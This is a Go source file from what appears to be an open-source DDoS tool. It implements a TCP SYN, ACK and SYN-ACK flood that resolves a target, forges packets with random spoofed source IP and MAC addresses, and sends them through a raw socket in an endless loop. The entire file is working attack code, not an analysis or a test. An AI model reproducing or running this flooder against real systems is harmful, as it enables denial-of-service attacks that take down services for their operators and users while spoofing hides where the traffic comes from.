package attacks

import (
	"context"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"regexp"
	"strconv"

	"github.com/TechMDW/GoDown/internal/terminal"
	"github.com/brianvoe/gofakeit/v6"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
)

var (
	ErrSyn             = errors.New(" failed to start syn flood")
	ErrResolveHost     = errors.New(" failed to resolve host")
	ErrSerializeTo     = errors.New(" failed to serialize ip")
	ErrParseHeader     = errors.New(" failed to parse ip header")
	ErrSerializeLayers = errors.New(" failed to serialize layers")
	ErrListenPacket    = errors.New(" failed to listen packet on 0.0.0.0")
	ErrNewRawConn      = errors.New(" failed to create raw connection over 0.0.0.0")
)

func StartSynFlood(target string, port, payloadLength int, floodType string) error {
	var (
		err              error
		ipHeader         *ipv4.Header
		rawConnection    *ipv4.RawConn
		packetConnection net.PacketConn
	)

	target, err = resolveHost(target)
	if err != nil {
		return ErrResolveHost
	}

	fmt.Printf("Attack type: %s\n", terminal.Output(floodType, terminal.Green))
	fmt.Printf("Attack payload size: %s byte\n", terminal.Output(strconv.Itoa(payloadLength), terminal.Cyan))
	fmt.Printf("Attacking %s:%s\n", terminal.Output(target, terminal.Red), terminal.Output(strconv.Itoa(port), terminal.Yellow))

	randomPayload := generateRandomPayload(payloadLength)

	for {
		tcpPacket := generateTcpPacket(gofakeit.IntRange(1024, 65535), port, floodType)
		ipPacket := generateIpPacket(gofakeit.IPv4Address(), target)

		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
			return err
		}

		ipBufferHeader := gopacket.NewSerializeBuffer()
		options := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		if err = ipPacket.SerializeTo(ipBufferHeader, options); err != nil {
			return ErrSerializeTo
		}

		if ipHeader, err = ipv4.ParseHeader(ipBufferHeader.Bytes()); err != nil {
			return ErrParseHeader
		}

		ethernetLayer := generateEthernetPacket([]byte(gofakeit.MacAddress()), []byte(gofakeit.MacAddress()))
		tcpBufferPayload := gopacket.NewSerializeBuffer()

		payload := gopacket.Payload(randomPayload)

		if err = gopacket.SerializeLayers(tcpBufferPayload, options, ethernetLayer, tcpPacket, payload); err != nil {
			return ErrSerializeLayers
		}

		if packetConnection, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
			fmt.Println(err)
			return ErrListenPacket
		}

		if rawConnection, err = ipv4.NewRawConn(packetConnection); err != nil {
			return ErrNewRawConn
		}
		fmt.Println("Sending packet")
		fmt.Println(ipHeader)
		if err = rawConnection.WriteTo(ipHeader, tcpBufferPayload.Bytes(), nil); err != nil {
			return err
		}
	}
}

func generateRandomPayload(len int) []byte {
	payload := make([]byte, len)
	rand.Read(payload)
	return payload
}

func generateTcpPacket(src, target int, attackType string) *layers.TCP {
	var (
		isSyn bool
		isAck bool
	)

	switch attackType {
	case "syn":
		isSyn = true

	case "ack":
		isAck = true

	case "synAck":
		isSyn = true
		isAck = true
	}

	return &layers.TCP{
		SrcPort: layers.TCPPort(src),
		DstPort: layers.TCPPort(target),
		Window:  14600,      // 1505 is the default window size
		Seq:     1105024978, // 11050 is the default sequence number
		SYN:     isSyn,
		ACK:     isAck,

		// options
		// urgent: 0
		// ack: 0
	}
}

func generateEthernetPacket(src, target []byte) *layers.Ethernet {
	return &layers.Ethernet{
		SrcMAC: net.HardwareAddr{src[0], src[1], src[2], src[3], src[4], src[5]},
		DstMAC: net.HardwareAddr{target[0], target[1], target[2], target[3], target[4], target[5]},
	}
}

func generateIpPacket(src, target string) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP:    net.ParseIP(src),
		DstIP:    net.ParseIP(target),
		Version:  4, // IPv4
		Protocol: layers.IPProtocolTCP,
	}
}

// get the host ip address
func findIP(host string) (string, error) {
	if net.ParseIP(host) != nil {
		return host, nil
	}

	ips, err := net.LookupIP(host)
	if err != nil {
		return "", err
	}

	for _, ip := range ips {
		if ip.To4() != nil {
			return ip.String(), nil
		}
	}

	return "", errors.New("no ip found")
}

func resolveHost(address string) (string, error) {
	var (
		err        error
		isValidIP  bool
		isValidDNS bool
	)

	if isValidIP, err = regexp.MatchString(`^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$`, address); err != nil {
		fmt.Println("Error while validating the ip")
	}

	if isValidDNS, err = regexp.MatchString(`^(([a-zA-Z]|[a-zA-Z][a-zA-Z0-9\\-]*[a-zA-Z0-9])\\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\\-]*[A-Za-z0-9])$`, address); err != nil {
		fmt.Println("Error while validating the ip")
	}

	if !isValidIP && isValidDNS {
		fmt.Println("already a DNS record provided, making DNS lookup")
		records, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", address)
		if err != nil {
			return "", errors.New("error while resolving the DNS record")
		}

		fmt.Println("DNS lookup successful -> DNS :: %s | IP :: %s", address, records[0].String())
		address = records[0].String()
	} else {
		fmt.Println("already an IP address provided, skipping DNS lookup")
	}

	return address, nil
}
